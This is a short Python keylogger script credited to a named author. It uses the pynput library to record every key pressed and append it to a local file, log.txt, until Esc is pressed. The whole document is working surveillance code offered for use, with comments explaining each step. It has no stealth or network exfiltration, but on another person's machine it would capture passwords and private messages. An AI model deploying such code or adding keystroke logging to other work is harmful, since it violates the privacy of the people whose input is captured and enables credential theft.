'''

This script was coded by, and belongs to:

        CodeZee - Zeeshan Ibrahim

'''

#import necessary modules
from pynput.keyboard import Key,Listener
import os.path

if os.path.exists("log.txt") == False:
    with open("log.txt", "a") as f:
        f.write("<--This is where the keys will be stored-->\n <--This file is automatically created -->\n")
else:
    with open("log.txt", "a") as f:
        f.write("\n**New log**\n")
#when a key is pressed
def press(Key):
    key_strokes = str(Key).replace("'","") #remove ' to give us just the character
    with open("log.txt", "a") as f:   #open or create text file in append mode
        if key_strokes=="Key.space":
            f.write(" ")   #if the key was spacebar, append an empty space
        elif len(key_strokes)>1:
            f.write("\n"+key_strokes+"\n")   #if many keys, seperate by new lines
        else:
            f.write(key_strokes)

#when a key is released
def release(Key):
        if str(Key)=="Key.esc":
            exit(0)     #if they press and release the escpe key, exit the program

#activates the keyboard listener and provides the on_press and on_release commands
with Listener(on_press = press, on_release = release) as listener:
    listener.join()
